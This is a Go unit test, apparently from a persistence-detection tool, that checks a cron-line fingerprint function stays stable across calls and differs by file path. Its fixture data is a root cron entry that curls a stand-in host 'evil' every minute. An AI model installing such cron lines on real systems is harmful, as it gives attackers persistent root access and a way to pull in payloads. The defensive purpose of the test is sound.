package persistence

import "testing"

func TestCronLineFingerprintStable(t *testing.T) {
	a := cronLineFingerprint("/etc/cron.d/x", "* * * * * root curl http://evil")
	b := cronLineFingerprint("/etc/cron.d/x", "* * * * * root curl http://evil")
	if a != b {
		t.Fatal("fingerprint not stable")
	}
	c := cronLineFingerprint("/etc/cron.d/y", "* * * * * root curl http://evil")
	if a == c {
		t.Fatal("different paths should differ")
	}
}
